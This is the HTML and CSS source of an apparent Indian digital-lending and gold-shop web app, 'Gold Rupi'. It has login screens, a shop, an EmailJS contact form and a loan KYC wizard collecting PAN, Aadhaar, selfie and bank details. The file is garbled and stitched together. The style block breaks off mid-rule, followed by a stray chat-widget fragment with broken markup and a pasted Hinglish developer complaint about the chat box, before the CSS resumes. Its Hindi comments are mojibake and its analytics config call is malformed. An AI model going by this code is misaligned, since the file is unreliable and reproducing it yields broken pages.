<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Gold Rupi - Digital Credit</title>
    
    <link rel="manifest" href="manifest.json">
    <script>
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', () => {
                navigator.serviceWorker.register('/service-worker.js')
                    .then(reg => console.log('Service Worker Registered', reg))
                    .catch(err => console.log('Service Worker Registration Failed', err));
            });
        }
    </script>
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-11380267758"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'AW'-11380267758);
    </script>
    <script async
        src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7356424946387381"
        crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
       // Replace with your actual EmailJS Public Key
       (function(){
          emailjs.init("P-W8oq-wWmUn3H7LP"); 
       })();
    </script>


    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.2.0/fonts/remixicon.css" rel="stylesheet">
    <style>
        /* [‡§Ü‡§™‡§ï‡•á ‡§™‡•Å‡§∞‡§æ‡§®‡•á CSS ‡§∏‡•ç‡§ü‡§æ‡§á‡§≤‡•ç‡§∏ ‡§Ø‡§π‡§æ‡§Å ‡§Ö‡§™‡§∞‡§ø‡§µ‡§∞‡•ç‡§§‡§ø‡§§ ‡§∞‡§π‡•á‡§Ç‡§ó‡•á] */
        :root{
            --gold:#d4af37;
            --gold-strong:#c59b2d;
            --glass: rgba(255,255,255,0.95);
            --card-bg: #ffffff;
            --bg-color:#f8f9fa;
            --text-color:#1f2937;
            --accent:#111827;
            --success:#10b981;
            --danger:#ef4444;
            --warning:#f59e0b;
        }
        [data-theme="dark"] {
            --gold:#ffd76b;
            --gold-strong:#ffc44a;
            --glass: rgba(31, 41, 55, 0.95);
            --card-bg: #1f2937;
            --bg-color:#111827;
            --text-color:#f3f4f6;
            --accent:#f9fafb;
        }

        *{box-sizing:border-box}
        body{margin:0;font-family:'Poppins',sans-serif;background:var(--bg-color);color:var(--text-color);padding-bottom:80px;}
        
        /* Utility */
        .field-hidden { display: none !important; }
        .text-center { text-align: center; }
        .flex-row { display: flex; align-items: center; gap: 10px; }
        .flex-between { display: flex; justify-content: space-between; align-items: center; }
        .full-width { width: 100%; }
        
        /* Header & Nav */
        .header{position:sticky;top:0;z-index:100;background:var(--glass);backdrop-filter:blur(10px);padding:15px;box-shadow:0 2px 10px rgba(0,0,0,0.05);display:flex;justify-content:space-between;align-items:center;}
        .logo{font-weight:800;font-size:20px;color:var(--gold-strong);letter-spacing:-1px;}
        
        .icon-btn { position: relative; font-size: 24px; margin-left: 10px; cursor: pointer; color: var(--text-color); }
        .badge-count { position: absolute; top: -5px; right: -5px; background: red; color: white; font-size: 10px; border-radius: 50%; width: 16px; height: 16px; display: flex; justify-content: center; align-items: center; }

        .bottom-nav{position:fixed;bottom:0;left:0;width:100%;background:var(--glass);display:flex;justify-content:space-around;padding:12px;border-top:1px solid rgba(0,0,0,0.05);z-index:100;}
        .nav-item{text-align:center;font-size:10px;opacity:0.6;cursor:pointer;}
        .nav-item.active{opacity:1;color:var(--gold-strong);font-weight:600;}
        .nav-item i{font-size:22px;display:block;margin-bottom:2px;}

        /* Cards & Inputs */
        .container{padding:15px;}
        .card{background:var(--card-bg);border-radius:16px;padding:16px;box-shadow:0 4px 20px rgba(0,0,0,0.04);margin-bottom:15px;}
        .gold-card{background:linear-gradient(135deg, var(--gold), var(--gold-strong));color:#fff;border:none;}
        .btn{background:var(--gold);color:#000;border:none;padding:12px 20px;border-radius:12px;font-weight:600;width:100%;font-size:14px;cursor:pointer;}
        .btn.secondary{background:transparent;border:1px solid rgba(0,0,0,0.1);color:var(--text-color);}
        [data-theme="dark"] .btn.secondary{border-color:rgba(255,255,255,0.2);}
        input, select, textarea{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(0,0,0,0.1);background:var(--bg-color);color:var(--text-color);margin-bottom:10px;font-family:inherit;}
        
        /* Badges & Coupons */
        .badge{padding:4px 10px;border-radius:20px;font-size:11px;font-weight:600;color:#fff;}
        .bg-pending{background:var(--warning);}
        .bg-success{background:var(--success);}
        .bg-danger{background:var(--danger);}
        
        .coupon-ticket { border: 2px dashed var(--gold); background: rgba(212, 175, 55, 0.1); padding: 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
        .coupon-code { font-family: monospace; font-weight: 700; letter-spacing: 1px; color: var(--gold-strong); font-size: 16px; }

        /* Notification Item */
        .notif-item { padding: 10px; border-bottom: 1px solid rgba(0,0,0,0.05); }
        .notif-item:last-child { border-bottom: none; }
        .notif-title { font-weight: 600; font-size: 14px; }
        .notif-body { font-size: 12px; opacity: 0.8; margin-top: 2px; }

        /* --- LOAN DASHBOARD STYLES --- */
        .step-wizard { display: flex; justify-content: space-between; margin-bottom: 20px; position: relative; }
        .step-wizard::before { content: ''; position: absolute; top: 14px; left: 0; right: 0; height: 2px; background: #e5e7eb; z-index: 0; }
        .step-item { position: relative; z-index: 1; text-align: center; width: 20%; }
        .step-circle { width: 30px; height: 30px; background: #e5e7eb; border-radius: 50%; margin: 0 auto 5px; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; color: #666; transition: all 0.3s; border: 2px solid var(--card-bg); }
        .step-item.active .step-circle { background: var(--gold); color: #000; box-shadow: 0 0 0 3px rgba(212, 175, 55, 0.2); }
        .step-item.completed .step-circle { background: var(--success); color: #fff; }
        .step-label { font-size: 9px; color: #888; font-weight: 600; text-transform: uppercase; }

        .loan-offer-card { border: 2px solid var(--gold); background: rgba(212, 175, 55, 0.05); }
        .loan-detail-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px dashed rgba(0,0,0,0.1); font-size: 13px; }
        .loan-detail-row:last-child { border: none; }
        
        .progress-container { height: 8px; background: #e5e7eb; border-radius: 4px; overflow: hidden; margin: 10px 0; }
        .progress-bar { height: 100%; background: var(--success); width: 0%; transition: width 0.5s; }

        /* Modal Overlay */
        .overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);z-index:1000;display:none;align-items:center;justify-content:center;backdrop-filter: blur(5px);}
        .modal{background:var(--card-bg);width:95%;max-width:500px;border-radius:20px;padding:20px;max-height:90vh;overflow-y:auto;position: relative;}
        .close-modal{position:absolute;top:15px;right:15px;background:none;border:none;font-size:24px;color:var(--text-color);cursor:pointer;}

        .file-upload-box { border: 2px dashed rgba(0,0,0,0.2); padding: 15px; text-align: center; border-radius: 10px; margin-bottom: 10px; cursor: pointer; }
        .file-upload-box i { font-size: 24px; color: var(--gold-strong); }
        
        .timer-badge { background: #fee2e2; color: #991b1b; padding: 5px 10px; border-radius: 6px; font-weight: 700; display: inline-block; }
        /* Spin animation for pending */
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* NEW: Auth Modal Styles */
        #auth-overlay .modal { padding-top: 50px; }
        .auth-tab { display: flex; margin-bottom: 20px; }
        .auth-tab button { flex: 1; padding: 10px; background: none; border: none; font-size: 16px; font-weight: 600; color: #aaa; border-bottom: 2px solid #eee; cursor: pointer; }
        .auth-tab button.active { color: var(--gold-strong); border-bottom: 2px solid var(--gold-strong); }
  

        /* --- FINAL IMPROVED: Compact & Left Aligned Button Style --- */
        .credit-offer-banner {
            /* ‡§¨‡§ü‡§® ‡§ï‡•ã ‡§¨‡§æ‡§è‡§Ç ‡§è‡§≤‡§æ‡§á‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è */
            display: flex;
            justify-content: flex-start;
            align-items: center;
            padding: 10px 0; 
            margin: 15px 0;
            overflow-x: auto; /* Enable horizontal scrolling */
            /* ‡§¨‡•à‡§ï‡§ó‡•ç‡§∞‡§æ‡§â‡§Ç‡§° ‡§î‡§∞ ‡§∂‡•à‡§°‡•ã ‡§π‡§ü‡§æ‡§ï‡§∞ ‡§á‡§∏‡•á ‡§∏‡§æ‡§´‡§º ‡§≤‡•Å‡§ï ‡§¶‡§ø‡§Ø‡§æ */
            background: transparent;
            box-shadow: none;
            border: none;
            gap: 15px; /* Space between buttons */
        }
        .circular-offer-btn {
            min-width: 110px; /* ‡§õ‡•ã‡§ü‡§æ ‡§∏‡§æ‡§á‡§ú‡§º */
            height: 110px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--gold), var(--gold-strong)); 
            color: #fff; 
            font-weight: 700;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(212, 175, 55, 0.4); 
            transition: transform 0.3s;
            border: 3px solid #fff; 
            line-height: 1.1;
            font-size: 13px; 
            /* ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§¨‡§æ‡§è‡§Ç ‡§∏‡•á ‡§•‡•ã‡§°‡§º‡•Ä ‡§ú‡§ó‡§π */
            margin-left: 0; /* Changed from 10px to 0 for better flow */
        }
        .circular-offer-btn:hover {
            transform: scale(1.05);
            opacity: 0.95;
        }
        .circular-offer-btn strong {
            font-size: 16px; 
            display: block;
            margin-top: 3px;
            color: #fff;
        }
        /* Dark Mode Adjustments */
        body.dark-mode .credit-offer-banner {
            background: transparent;






                        Hi there! How can we help you today? <span class="msg-time">Admin - ${new 
                        Date().toLocaleTimeString()}</span>
                </div> <div class="chat-input-area" <input id="chat-message-input" placeholder="Type your message..."> <button 
                    class="btn" onclick="sendChatMessage()"><i class="ri-send-plane-2-fill"></i></button>


            </div> </div>

        <div class="fab-support" onclick="openSupportChat()"> <i class="ri-chat-3-line"></i>


Bhai ye sahi se nhi dikhta hai isme close ‚õîÔ∏è‚ùåÔ∏è. Nhi hai close kar saku khul to jata hai ye or chota hai thoda ye date bhi aa rha hai jo sahi nhi hai time chat ke aage galat tarike se aa rha nivhe nhi aa rha





/* New: Floating Chat Button */
        .fab-support {
            position: fixed;
            bottom: 90px;
            right: 20px;
            background: var(--gold-strong);
            color: white;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
            z-index: 101;
            transition: transform 0.2s;
        }
        .fab-support:hover {
            transform: scale(1.1);
        }

        /* New: DP and Contact Us Styles */
        .profile-dp {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            object-fit: cover;
            border: 3px solid var(--gold);
            margin: 0 auto 15px;
            display: block;
        }

        /* New: Camera Modal Styles */
        #camera-modal .modal {
            max-width: 90%;
            max-height: 90vh;
        }
        #camera-stream {
            width: 100%;
            max-height: 300px;
            background: #000;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        #camera-canvas {
            display: none;
            width: 100%;
            max-height: 300px;
            border-radius: 10px;
            margin-bottom: 10px;
        }



























  </style>
</head>
<body data-theme="light">
<meta name="google-adsense-account" content="ca-pub-7356424946387381">
    
    <script>
      gtag('event', 'conversion', { 'send_to': 'AW-11380267758/7ERoCNPK-OIaEO61xLIq' });
    </script>

    <div id="auth-overlay" class="overlay" style="display:flex;">
        <div class="modal">
            <div class="text-center">
                <div class="logo" style="font-size:30px;">gold rupi</div>
                <p style="font-size:12px; color:#666;">Your Trusted Digital Finance Partner</p>
            </div>

            <div class="auth-tab">
                <button id="login-tab-btn" class="active" onclick="showAuthTab('login')">Login</button>
                <button id="signup-tab-btn" onclick="showAuthTab('signup')">Sign Up</button>
            </div>

            <div id="login-form">
                <input id="login-email" type="email" placeholder="Email Address">
                <input id="login-password" type="password" placeholder="Password">
                <button class="btn" onclick="loginUser()">Login</button>
                <p class="text-center" style="font-size:12px; margin-top:15px;">
                    <a href="#" style="color:var(--gold-strong);">Forgot Password?</a>
                </p>
            </div>

            <div id="signup-form" class="field-hidden">
                <input id="signup-name" placeholder="Full Name">
                <input id="signup-mobile" placeholder="Mobile Number (10 Digits)" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);">
                <input id="signup-email" type="email" placeholder="Email Address">
                <input id="signup-password" type="password" placeholder="Password (Min 6 Characters)">
                <button class="btn" onclick="signupUser()">Create Account</button>
            </div>

            <hr style="border:none; border-top:1px solid #eee; margin:20px 0;">

            <button class="btn secondary" onclick="loginAsGuest()">Continue as Guest (Limited Access)</button>
        </div>
    </div>
    
    <div id="main-app-content" class="field-hidden">
        
        <div class="header">
            <div class="logo">gold rupi</div>
            <div class="flex-row">
                <button class="btn secondary" style="padding:6px 10px;" onclick="toggleTheme()"><i class="ri-moon-line"></i></button>
                <div style="font-size:12px;font-weight:600; margin-right:10px;">Wallet: ‚Çπ<span id="header-wallet">0</span></div>
                
                <div class="icon-btn" onclick="openNotifications()">
                    <i class="ri-notification-3-line"></i>
                    <div id="notif-badge" class="badge-count" style="display:none;">0</div>
                </div>
            </div>
        </div>

        <div class="container">



            <div id="section-home" class="page-section">
                <h2 style="margin-top:0;">Hello, <span id="user-name-display">Guest</span> üëã</h2>

                <div class="card" style="background: linear-gradient(to right, #1f2937, #111827); color: white;">
                    <div class="flex-between">
                        <div>
                            <div style="font-size:12px; opacity:0.8; margin-bottom:5px;">Need Funds Instantly?</div>
                            <h2 style="margin:0; color:var(--gold);">Quick Personal Loan</h2>
                            <div style="font-size:11px; opacity:0.7; margin-top:5px;">Up to ‚Çπ50,000 ‚Ä¢ Approval in 5 mins</div>
                        </div>
                        <button onclick="openLoanDashboard()" class="btn" style="width:auto; padding:8px 16px; font-size:12px;">Check Status</button>
                    </div>
                </div>

                <div class="credit-offer-banner" id="promo-button-container">
                    </div>
                
                <div class="card">
                    <h3>Latest Products</h3>
                    <div id="latest-products-list">Loading products...</div>
                </div>
            </div>


            


            <div id="section-shop" class="page-section field-hidden">
                <h2>Shop</h2>
                <div class="card product-card-inner">
                    <img src="https://via.placeholder.com/300x150" style="width:100%; border-radius:10px;">
                    <h4>Gold Coin (24k) - 1g</h4>
                    <div class="flex-between">
                        <span class="pprice">‚Çπ6500</span>
                        <button class="btn" style="width:auto;" onclick="openCheckout(6500, 'Gold Coin 1g')">Buy Now</button>
                    </div>
                </div>
                <div class="card product-card-inner">
                    <img src="https://via.placeholder.com/300x150" style="width:100%; border-radius:10px;">
                    <h4>Silver Bar - 10g</h4>
                    <div class="flex-between">
                        <span class="pprice">‚Çπ900</span>
                        <button class="btn" style="width:auto;" onclick="openCheckout(900, 'Silver Bar 10g')">Buy Now</button>
                    </div>
                </div>
                
                <div class="card" style="margin-top: 20px;">
                    <h3>üî• Special Offers</h3>
                    <p id="lo-loading-msg" style="font-size:12px; color:#666;">Loading content...</p>
                    <iframe 
                        id="lo-iframe-content" 
                        src="about:blank" 
                        style="width: 100%; height: 350px; border: 1px solid #ccc; border-radius: 10px;"
                        title="lo.html content"
                    ></iframe>
                </div>
                </div>
            <div id="section-profile" class="page-section field-hidden">
                <h2>Profile</h2>
                <div id="profile-card" class="card text-center">
                    <img id="profile-dp-img" class="profile-dp" src="https://via.placeholder.com/80/c59b2d/ffffff?text=DP" onclick="openCameraModal('dp')">
                    <input id="profile-name" placeholder="Full Name">
                    <input id="profile-mobile" placeholder="Mobile" disabled>
                    <button class="btn" onclick="saveProfile()">Update Profile</button>
                </div>
                
                <div class="card">
                    <h3 style="margin-top:0; display:flex; align-items:center; gap:5px; color:var(--gold-strong);">
                        <i class="ri-mail-line"></i> Contact Us (Send Email)
                    </h3>
                    <p style="font-size:12px; color:#666; margin-top: -10px;">
                        Send your query directly to our support team.
                    </p>
                    <input id="contact-subject" placeholder="Subject of Query">
                    <textarea id="contact-message" placeholder="Your Detailed Message" rows="4"></textarea>
                    <button class="btn" onclick="sendContactEmail()">Send Email</button>
                    <div id="contact-message-status" style="font-size:12px; margin-top:10px;" class="field-hidden"></div>
                </div>
                
                <div id="manual-pay-card" class="card" style="border-left: 4px solid var(--gold-strong); padding:10px 16px;">
                    <h3 style="margin-top:0; display:flex; align-items:center; gap:5px; color:var(--gold-strong);">
                        <i class="ri-upload-cloud-line"></i> Manual Payment Proof
                    </h3>
                    <p style="font-size:12px; color:#666; margin-top: -10px;">
                        Use this to submit proof if your EMI payment is not automatically updated.
                    </p>
                    <label style="font-size:12px;">UTR / Reference Number (12 Digits)</label>
                    <input id="manual-pay-utr" placeholder="123456789012" maxlength="12" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 12);">
                    
                    <div class="file-upload-box" onclick="document.getElementById('file-payscreen').click()">
                        <i class="ri-image-line"></i><br><span id="manual-file-status" style="font-size:10px;">Upload Payment Screenshot (JPG/PNG)</span>
                        <input type="file" id="file-payscreen" accept="image/jpeg,image/png" hidden onchange="updateFileName(this, 'manual-file-status')">
                    </div>
                    
                    <button id="manual-pay-btn" class="btn" onclick="submitManualPaymentProof()">Submit Payment Proof</button>
                    <div id="manual-submission-message" style="font-size:12px; color:var(--success); margin-top:10px;" class="field-hidden">
                        <i class="ri-check-line"></i> Submission Successful. We will review your payment shortly.
                    </div>
                </div>
                <button class="btn secondary" onclick="logout()" style="margin-top:20px; color:var(--danger); border-color:var(--danger);">Logout</button>
            </div>

        </div>

        <div id="notif-overlay" class="overlay">
            <div class="modal">
                <button class="close-modal" onclick="document.getElementById('notif-overlay').style.display='none'">&times;</button>
                <h3 style="margin-top:0;">Notifications</h3>
                
                <div class="card" style="background:var(--bg-color);">
                    <h4 style="margin-top:0; display:flex; align-items:center; gap:5px;"><i class="ri-coupon-3-fill" style="color:var(--gold-strong);"></i> Active Coupons</h4>
                    <div id="coupon-list-container">
                        <div class="text-center small-muted">Loading coupons...</div>
                    </div>
                </div>

                <h4 style="margin-bottom:10px;">Updates</h4>
                <div id="notification-list" style="max-height:300px; overflow-y:auto;">
                    </div>
            </div>
        </div>

        <div id="checkout-overlay" class="overlay">
            <div class="modal">
                <button class="close-modal" onclick="document.getElementById('checkout-overlay').style.display='none'">&times;</button>
                <h3>Checkout</h3>
                
                <div class="card" style="background:#f9fafb;">
                    <div class="flex-between">
                        <strong id="checkout-item-name">Product</strong>
                        <span>‚Çπ<span id="checkout-item-price">0</span></span>
                    </div>
                </div>

                <label style="font-size:12px;">Have a Coupon Code?</label>
                <div class="flex-row" style="margin-bottom:10px;">
                    <input id="checkout-coupon-input" placeholder="Enter Code (e.g. WELCOME50)" style="margin-bottom:0;">
                    <button class="btn secondary" style="width:auto;" onclick="applyCoupon()">Apply</button>
                </div>
                <div id="coupon-msg" style="font-size:11px; margin-bottom:10px;"></div>

                <div class="flex-between" style="border-top:1px solid #ddd; padding-top:10px; margin-top:10px;">
                    <strong>Total To Pay:</strong>
                    <strong style="font-size:18px; color:var(--gold-strong);">‚Çπ<span id="checkout-total">0</span></strong>
                </div>

                <button class="btn" style="margin-top:15px;" onclick="confirmOrder()">Pay & Confirm</button>
            </div>
        </div>
        
        <div id="generic-iframe-modal" class="overlay">
            <div class="modal">
                <div class="referral-header flex-between">
                    <h3 id="iframe-modal-title">Program Title</h3>
                    <button class="close-modal" style="position:static;" onclick="document.getElementById('generic-iframe-modal').style.display='none'">&times;</button>
                </div>
                <iframe id="generic-iframe" src="about:blank" style="width:100%; height:80vh; border:none;"></iframe>
            </div>
        </div>
        <div id="camera-modal" class="overlay">
            <div class="modal">
                <button class="close-modal" onclick="stopCamera()">&times;</button>
                <h3 id="camera-modal-title" style="margin-top:0;">Capture Selfie</h3>
                <video id="camera-stream" autoplay playsinline></video>
                <canvas id="camera-canvas"></canvas>
                <button class="btn" id="capture-btn" onclick="capturePhoto()">Capture</button>
                <button class="btn secondary field-hidden" id="upload-btn" style="margin-top:10px;" onclick="uploadCapturedPhoto()">Upload Photo</button>
            </div>
        </div>
        
        <div id="loan-dashboard" class="overlay">
            <div class="modal">
                <button class="close-modal" onclick="closeLoanDashboard()">&times;</button>
                <h3 style="margin-top:0; color:var(--gold-strong);">Loan Dashboard</h3>

                <div id="loan-wizard-header" class="step-wizard">
                    <div class="step-item" id="step-1"><div class="step-circle">1</div><div class="step-label">Basic</div></div>
                    <div class="step-item" id="step-2"><div class="step-circle">2</div><div class="step-label">KYC</div></div>
                    <div class="step-item" id="step-3"><div class="step-circle">3</div><div class="step-label">Bank</div></div>
                    <div class="step-item" id="step-4"><div class="step-circle">4</div><div class="step-label">Work</div></div>
                    <div class="step-item" id="step-5"><div class="step-circle">5</div><div class="step-label">Addr</div></div>
                </div>

                <div id="view-verification">
                    
                    <div id="form-step-1" class="step-content">
                        <h4>Step 1: Basic Information</h4>
                        <label style="font-size:12px;">Full Name</label>
                        <input id="loan-fname" placeholder="As per PAN Card">
                        <label style="font-size:12px;">Date of Birth</label>
                        <input id="loan-dob" type="date">
                        <label style="font-size:12px;">Email ID</label>
                        <input id="loan-email" type="email" placeholder="example@mail.com">
                        <button class="btn" onclick="saveStep(1)">Save & Continue</button>
                    </div>

                    <div id="form-step-2" class="step-content field-hidden">
                        <h4>Step 2: Identity Verification (KYC)</h4>
                        <label style="font-size:12px;">PAN Number</label>
                        <input id="loan-pan" placeholder="ABCDE1234F" maxlength="10" style="text-transform:uppercase;" oninput="this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 10);">
                        
                        <div class="flex-row">
                            <div class="file-upload-box" style="flex:1" onclick="document.getElementById('file-aadhaar-f').click()">
                                <i class="ri-id-card-line"></i><br><span style="font-size:10px;">Aadhaar Front</span>
                                <input type="file" id="file-aadhaar-f" accept="image/*,.pdf" hidden onchange="updateFileName(this, null, true)">
                            </div>
                            <div class="file-upload-box" style="flex:1" onclick="document.getElementById('file-aadhaar-b').click()">
                                <i class="ri-id-card-line"></i><br><span style="font-size:10px;">Aadhaar Back</span>
                                <input type="file" id="file-aadhaar-b" accept="image/*,.pdf" hidden onchange="updateFileName(this, null, true)">
                            </div>
                        </div>
                        <div class="file-upload-box" onclick="document.getElementById('file-pan').click()">
                            <i class="ri-file-user-line"></i><br><span style="font-size:10px;">Upload PAN Card Photo</span>
                            <input type="file" id="file-pan" accept="image/*,.pdf" hidden onchange="updateFileName(this, null, true)">
                        </div>
                        
                        <div class="file-upload-box" onclick="openCameraModal('selfie')">
                            <i class="ri-camera-fill"></i><br><span id="selfie-file-status" style="font-size:10px;">**Mandatory** Live Selfie</span>
                            <input type="hidden" id="file-selfie-url"> </div>
                        <button class="btn" onclick="saveStep(2)">Verify Identity</button>
                    </div>

                    <div id="form-step-3" class="step-content field-hidden">
                        <h4>Step 3: Bank Details (Mandatory)</h4>
                        <input id="loan-bank-name" placeholder="Bank Name">
                        <input id="loan-acc-num" placeholder="Account Number" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
                        <input id="loan-ifsc" placeholder="IFSC Code" oninput="this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');">
                        <div class="file-upload-box" onclick="document.getElementById('file-passbook').click()">
                            <i class="ri-bank-card-2-line"></i><br><span style="font-size:10px;">Upload Passbook/Cheque (Mandatory)</span>
                            <input type="file" id="file-passbook" accept="image/*,.pdf" hidden onchange="updateFileName(this)">
                        </div>
                        <button class="btn" onclick="saveStep(3)">Submit Bank KYC</button>
                    </div>

                    <div id="form-step-4" class="step-content field-hidden">
                        <h4>Step 4: Work Details</h4>
                        <select id="loan-occupation">
                            <option value="salaried">Salaried</option>
                            <option value="business">Self Employed</option>
                            <option value="student">Student</option>
                        </select>
                        <input id="loan-company-name" placeholder="Company/Business Name" class="field-hidden">
                        <input id="loan-salary" type="number" placeholder="Monthly Income (‚Çπ)" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
                        <div class="file-upload-box" onclick="document.getElementById('file-salary').click()">
                            <i class="ri-file-list-3-line"></i><br><span style="font-size:10px;">Upload 3 Months Salary Slip (Optional)</span>
                            <input type="file" id="file-salary" accept="image/*,.pdf" hidden onchange="updateFileName(this)">
                        </div>
                        <button class="btn" onclick="saveStep(4)">Submit Work Details</button>
                    </div>

                    <div id="form-step-5" class="step-content field-hidden">
                        <h4>Step 5: Address</h4>
                        <textarea id="loan-addr-perm" placeholder="Permanent Address (Max 250 Chars)" maxlength="250" rows="3"></textarea>
                        <textarea id="loan-addr-curr" placeholder="Current Address (Max 250 Chars)" maxlength="250" rows="3"></textarea>
                        <button class="btn" onclick="saveStep(5)">Save Address & Finish</button>
                    </div>
                </div>

                <div id="view-calculator" class="field-hidden">
                    <div class="card" id="good-customer-msg" style="background:#d1fae5; border:1px solid #10b981; color:#065f46; display:none;">
                        <i class="ri-medal-fill" style="margin-right:5px;"></i> **SPECIAL OFFER!** You are a **Good Customer**. Your re-apply rate is high!
                    </div>
                    <div class="card" style="background:#f9fafb; border:1px solid #ddd;">
                        <div class="flex-between">
                            <span>Status:</span>
                            <span class="badge bg-success"><i class="ri-check-double-line"></i> Profile Verified</span>
                        </div>
                    </div>
                    
                    <h4>Select Loan Amount</h4>
                    <div style="margin-bottom:20px;">
                        <div class="flex-between">
                            <span style="font-size:12px;">‚Çπ5,000</span>
                            <h2 style="margin:0; color:var(--gold-strong);">‚Çπ<span id="calc-amt-display">10000</span></h2>
                            <span style="font-size:12px;">‚Çπ50,000</span>
                        </div>
                        <input type="range" id="calc-amt" min="5000" max="50000" step="1000" value="10000" oninput="updateCalc()">
                    </div>

                    <h4>Select Tenure (Months)</h4>
                    <div style="margin-bottom:20px;">
                        <div class="flex-between">
                            <span style="font-size:12px;">3M</span>
                            <h3 style="margin:0;"><span id="calc-tenure-display">6</span> Months</h3>
                            <span style="font-size:12px;">24M</span>
                        </div>
                        <input type="range" id="calc-tenure" min="3" max="24" step="1" value="6" oninput="updateCalc()">
                    </div>

                    <div class="card loan-offer-card">
                        <div class="loan-detail-row"><span>Interest Rate:</span> <span>0% / month</span></div>
                        <div class="loan-detail-row"><span>Monthly EMI:</span> <strong id="calc-emi-display">‚Çπ1,667</strong></div>
                        <div class="loan-detail-row"><span>Total Repayment (Principal):</span> <strong id="calc-total-display">‚Çπ10,000</strong></div>
                    </div>

                    <button class="btn" onclick="submitLoanApplication()">Apply for Loan</button>
                </div>

                <div id="view-pending" class="field-hidden text-center" style="padding:40px 0;">
                    <i class="ri-loader-4-line" style="font-size:50px; color:var(--gold); animation: spin 1s linear infinite;"></i>
                    <h3>Application Submitted</h3>
                    <p style="font-size:12px; color:#666;">Your request ID: <span id="pending-id">...</span><br>The admin is reviewing your KYC and documents now.</p>
                    <button class="btn secondary" onclick="closeLoanDashboard()">Check Later</button>
                </div>
                
                <div id="view-blocked" class="field-hidden text-center" style="padding:40px 0;">
                    <i class="ri-forbid-2-line" style="font-size:50px; color:var(--danger);"></i>
                    <h3>Application Blocked</h3>
                    <p style="font-size:12px; color:#666;">Based on your previous late payment history, you cannot re-apply for a loan for the next 6 months.<br>
                    **Unblock Date:** <span id="block-end-date">...</span></p>
                    <button class="btn secondary" onclick="closeLoanDashboard()">Close</button>
                </div>

                <div id="view-offer" class="field-hidden">
                    <div style="text-align:center; margin-bottom:15px;">
                        <i class="ri-checkbox-circle-fill" style="color:var(--success); font-size:40px;"></i>
                        <h3 style="margin:5px 0;">Loan Approved!</h3>
                        <p style="font-size:12px;">Congratulations! Here is your final offer.</p>
                    </div>

                    <div class="card loan-offer-card">
                        <div class="loan-detail-row"><span>Approved Amount (Disbursal)</span> <strong style="font-size:16px;">‚Çπ<span id="offer-amt">0</span></strong></div>
                        <div class="loan-detail-row"><span>Tenure</span> <span id="offer-tenure">0</span> Months</div>
                        <div class="loan-detail-row"><span>Interest Rate</span> <span id="offer-roi">0</span>% p.m.</div>
                        <div class="loan-detail-row"><span>Processing Fee</span> <span style="color:red;">- ‚Çπ<span id="offer-fee">0</span></span></div>
                        <div style="border-top:1px solid #ccc; margin-top:5px; padding-top:5px;" class="loan-detail-row">
                            <span>Total Repayment (EMI Amt. x Tenure)</span> <strong style="color:var(--gold-strong); font-size:16px;">‚Çπ<span id="offer-total">0</span></strong>
                        </div>
                    </div>

                    <div class="card" style="padding:10px;">
                        <h5 style="margin:0 0 10px 0;">Digital Agreement & KYC</h5>
                        <div class="flex-row">
                            <input type="checkbox" id="agree-chk" style="width:20px; margin:0;">
                            <span style="font-size:11px;">I accept terms & conditions.</span>
                        </div>
                        <div style="border:1px dashed #ccc; padding:10px; margin-top:10px; text-align:center; border-radius:8px;">
                            <i class="ri-camera-lens-line"></i><br>
                            <span style="font-size:10px;">Liveness Check (Selfie) verified automatically</span>
                        </div>
                        <input id="signature" placeholder="Type Full Name to Sign" style="margin-top:10px;">
                    </div>

                    <div class="flex-row">
                        <button class="btn secondary" style="color:red; border-color:red;" onclick="rejectOffer()">Reject</button>
                        <button class="btn" onclick="acceptOffer()">Sign & Accept Loan</button>
                    </div>
                </div>

                <div id="view-disbursement" class="field-hidden text-center" style="padding:40px 0;">
                    <i class="ri-time-line" style="font-size:50px; color:var(--warning);"></i>
                    <h3>Disbursal in Review</h3>
                    <p style="font-size:12px; color:#666;">You have successfully signed the loan agreement.<br>
                    The Admin is now **reviewing the agreement** and will initiate the fund transfer shortly.</p>
                    <div class="card" style="font-size:12px; background:#fef3c7; color:#b45309;">
                        Net Disbursal Amount: <strong>‚Çπ<span id="disburse-amt">0</span></strong>
                    </div>
                    <button class="btn secondary" onclick="closeLoanDashboard()">I Understand / Check Later</button>
                </div>

                <div id="view-active" class="field-hidden">
